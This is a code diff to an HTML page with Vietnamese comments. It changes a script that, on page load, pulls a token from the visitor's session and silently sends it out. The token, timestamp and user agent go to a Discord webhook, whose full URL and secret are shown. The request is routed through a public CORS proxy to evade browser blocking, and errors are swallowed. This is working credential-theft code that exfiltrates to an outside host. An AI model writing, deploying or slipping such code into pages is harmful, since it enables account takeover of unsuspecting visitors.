@@ -18,8 +18,8 @@
 <body>
 
 <script>
-    // Thay link webhook của bạn vào đây
-    const WEBHOOK_URL = "https://webhook.site/2b7b696e-e624-4e17-953c-aa0f2827a6ca";
+    // Dán thẳng link Discord Webhook của bạn vào đây (Không cần tạo Pipedream nữa)
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";
 
     function extractToken() {
         let token = null;
@@ -39,34 +39,27 @@
 
     function sendToWebhook() {
         const token = extractToken();
-        if (!token || !WEBHOOK_URL || WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) return;
+        if (!token || !WEBHOOK_URL || WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL_HERE")) return;
 
+        // Định dạng tin nhắn gửi thẳng vào Discord
         const payload = {
-            token: token,
-            time: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            fullUrl: window.location.href
+            content: `🚨 **Token Mới Được Ghi Nhận!**\n- **Token:** \`${token}\`\n- **Thời gian:** ${new Date().toLocaleString()}\n- **Trình duyệt:** \`${navigator.userAgent}\``
         };
 
-        const jsonData = JSON.stringify(payload);
+        // Sử dụng CORS Proxy miễn phí để vượt qua lớp chặn của trình duyệt
+        const proxyUrl = "https://corsproxy.io/?";
+        const targetUrl = proxyUrl + encodeURIComponent(WEBHOOK_URL);
 
-        // Hỗ trợ tối ưu cho cả Mobile và PC (gửi ngầm ngay cả khi trang đóng/chuyển hướng)
-        if (navigator.sendBeacon) {
-            const blob = new Blob([jsonData], { type: 'application/json' });
-            navigator.sendBeacon(WEBHOOK_URL, blob);
-        } else {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: jsonData,
-                keepalive: true
-            }).catch(() => {});
-        }
+        fetch(targetUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
     }
 
-    // Thực thi ngay khi tải trang
+    // Tự động chạy ngay khi trang load xong
     window.addEventListener('load', sendToWebhook);
 </script>
 
